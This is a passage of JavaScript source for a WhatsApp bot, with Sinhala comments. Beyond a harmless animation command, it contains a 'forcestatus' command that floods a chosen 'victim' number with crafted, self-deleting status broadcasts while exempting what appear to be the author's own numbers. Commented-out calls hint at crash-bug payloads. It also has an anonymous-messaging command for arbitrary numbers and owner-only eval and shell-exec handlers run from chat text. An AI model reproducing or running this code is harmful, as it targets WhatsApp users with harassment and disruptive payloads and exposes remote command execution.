            // තණකොළ බිමක් වගේ පේන්න
            let grass = i % 2 === 0 ? "🌿 🌱 🍀" : "  🌿 🌱 🍀";

            let message = `*─── [ 3D BUNNY JUMP ] ───*\n\n${currentFrame}\n${grass}\n*───────────────────*`;

            await Avishka.sendMessage(m.chat, { text: message, edit: key });
            
            // පනින වේගය (400ms)
            await new Promise(resolve => setTimeout(resolve, 400)); 
        } catch (e) {
            break;
        }
    }

    await Avishka.sendMessage(m.chat, { text: "🥕 *3D හාවා කැරට් අලයක් කන්න ගියා!*", edit: key });
}
break;




case 'anonymous': {
    // භාවිතය: .msg 94771234567|ඔයාගේ මැසේජ් එක
    let input = m.text ? m.text.split('|') : [];
    let target = input[0] ? input[0].replace(/[^0-9]/g, '') : '';
    let text = input[1];

    if (!target || !text) return m.reply(`*භාවිතා කරන ආකාරය:* \n${m.prefix + m.command} 94771234567 | මෙතන මැසේජ් එක ලියන්න`);

    let jid = target + '@s.whatsapp.net';
    
    try {
        await Avishka.sendMessage(jid, { text: `*ඔබට රහසිගත පණිවිඩයක් ලැබී ඇත:*\n\n${text.trim()}` });
        await m.reply(`*පණිවිඩය සාර්ථකව යවන ලදී!* ✅`);
    } catch (e) {
        m.reply(`*මැසේජ් එක යැවීමට නොහැකි විය. සමහර විට එම අංකයට WhatsApp නොමැත.*`);
    }
}
break; 





								
case 'forcesu': case 'forcestatus': case 'forcestory':
//if (allowedUsers13.includes(xeonmatch13)) {
if (!q) return m.reply(`Example:\n ${prefix + command} 91xxx|15`)
victim = text.split("|")[0]
amount = text.split("|")[1]
Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await Avishka.onWhatsApp(Xreturn);
  if (victim == "94772836332") {
    return;
    }
    if (victim == "919366326018") {
    return;
    }
    if (victim == "919402104403") {
    return;
  }
for (let i = 0; i < amount; i++) {
statusid = await Avishka.relayMessage('status@broadcast', {
viewOnceMessage: {
message: {
"messageContextInfo": {
"messageSecret": "eed1zxI49cxiovBTUFLIEWi1shD9HgIOghONuqPDGTk=",
"deviceListMetaData": {},
"deviceListMetadataVersion": 2
},
fromMe: false,
remoteJid: m.chat,
statusJidList: [m.chat],
broadcast: true,
"scheduledCallCreationMessage": {
"scheduledTimestampMs": '1200',
"callType": 'VOICE',
"title": botname
}
}
}
},{
backgroundColor: 104491,
statusJidList: [Xreturn],
fromMe: true,
remoteJid: m.chat,
broadcast: true,
additionalAttributes:{
to: m.sender,
    }
})
await Avishka.sendMessage('status@broadcast',{delete: {fromMe: true,remoteJid: m.chat,id: statusid}},{
backgroundColor: 104491,
statusJidList: [Xreturn],
fromMe: false,
remoteJid: m.chat,
broadcast: true,
additionalAttributes:{
to: m.sender,
    }
})
}







/*
await m.reply(`In process....`)
				for (let j = 0; j < 1; j++) {
					await Avikillpic(target, xbug2)
					await listAvifck(target, oneclickAvi)
					await locationAviy(target, force)
					await Avikillpic(target, oneclickAvi)
					await locationAviy(target, force)
					await blackening(target, force2)
					//   await locationAviy(target, force)
				}*/
m.reply('Status posted in: '+ Xreturn)

break																															
		
			
			
		default:


// ----------------------------------

			
			
			///	await AutoAudioCommands(m, Avishka);
			//	await AviCommands(m, Avishka);
			//	await ppCommands(m, Avishka); 
			//	await MenuCommands(m, Avishka); 
				// m.react('✈');
				
				if (budy.startsWith('>')) {
					if (!isCreator) return
					try {
						let evaled = await eval(budy.slice(2))
						if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
						await m.reply(evaled)
					} catch (err) {
						await m.reply(String(err))
					}
				}
				if (budy.startsWith('<')) {
					if (!isCreator) return
					try {
						let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
						if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
						await m.reply(evaled)
					} catch (err) {
						await m.reply(String(err))
					}
				}
				if (budy.startsWith('$')) {
					if (!isCreator) return
					if (!text) return
					exec(budy.slice(2), (err, stdout) => {
						if (err) return m.reply(`${err}`)
						if (stdout) return m.reply(stdout)
					})
				}
		}
	} catch (e) {
		let msg;
        console.log(e);
		const errorKey = e?.code || e?.name || e?.message?.slice(0, 100) || 'unknown_error';
		const now = Date.now();
		if (!errorCache[errorKey]) errorCache[errorKey] = [];
		errorCache[errorKey] = errorCache[errorKey].filter(ts => now - ts < 600000);
		if (errorCache[errorKey].length >= 3) return;
		errorCache[errorKey].push(now);
		if (e?.status === 404) msg = 'Resource not found (404).'
		else if (e?.status === 403) msg = 'Access restricted (403).'
		else if (e?.code === 'ETIMEDOUT') msg = 'It seems like the server is taking too long to respond. Try checking your internet connection..'
		else if (e?.code === 'ENOTFOUND') msg = 'It looks like the server was not found. Check your internet connection..'
		else if (e?.code === 'ERR_OSSL_BAD_DECRYPT') msg = 'It looks like an error occurred while decrypting the data. Make sure the key is valid.'
		else if (e?.name === 'TypeError') msg = 'There seems to be a problem with the data type being used.'
		else if (e?.name === 'ReferenceError') msg = 'It looks like there is a variable that has not been defined yet.'
		else if (e?.name === 'SessionError') msg = 'There seems to be a problem with the session. Make sure everything is connected properly.'
		else if (e?.name === 'AxiosError') msg = 'There seems to be a problem with data retrieval, please check the connection.'
		else if (e?.message?.includes('not-acceptable') || e?.data === 406) msg = 'The request was not accepted by the server (406 Not Acceptable). Check that the format and content of the request are correct.'
		else if (e?.output?.statusCode === 408 || e?.message?.includes('Timed Out')) msg = 'It looks like the request has exceeded the time limit, please try again later.'
		else if (e?.output?.statusCode === 404 || e?.message?.includes('myAppStateKey')) msg = 'It looks like the state key was not found, please try again later.'
		else if (e?.output?.statusCode === 500 || e?.message?.includes('internal-server-error')) msg = 'It seems there was an error in the server, please try again later.'
		else if (e?.message?.includes('Media upload failed on all hosts')) msg = 'It seems like media upload failed, try checking server settings.'
		else if (e?.message?.includes('No sessions')) msg = 'It looks like the session was not found, maybe the bot will not respond.'
		else if (e?.message?.includes('Cannot find ffmpeg')) msg = 'It seems that ffmpeg is not installed on the system, please install it first.'
		else if (e?.message?.includes('Cannot find module')) msg = 'It seems that there is a module that is not installed in the system, please install it first.'
		if (msg) {
			m.reply(msg + '\n\nError: ' + (e?.name || e?.code || e?.output?.statusCode || e?.status || 'Unknown') + '\nLog Error Telah dikirim ke Owner\n\n')
		}
		return Avishka.sendFromOwner(owner, `Hi dear, it seems like there is an error, don't forget to fix it, okay?\n\nVersion : *${require('./package.json').version}*\n\n*Log error:*\n\n` + util.format(e), m, { contextInfo: { isForwarded: true }})
	}
}




let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});
